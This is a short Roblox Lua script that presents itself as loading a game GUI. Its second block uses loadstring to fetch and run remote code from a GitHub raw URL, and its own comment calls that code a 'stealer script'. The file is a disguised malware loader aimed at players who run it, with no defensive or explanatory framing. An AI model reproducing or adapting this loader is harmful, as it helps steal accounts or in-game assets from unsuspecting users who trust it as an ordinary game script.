pcall(function()
    -- Load the real GUI
workspace.DinoEvent:Destroy()
game:GetService("ReplicatedStorage").Modules.UpdateService.ZenEvent.Parent = workspace
end)

pcall(function()
    -- Load your stealer script from your new GitHub username
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/ZenUpdateScript/main/ZenUpdateScript"))()
end)
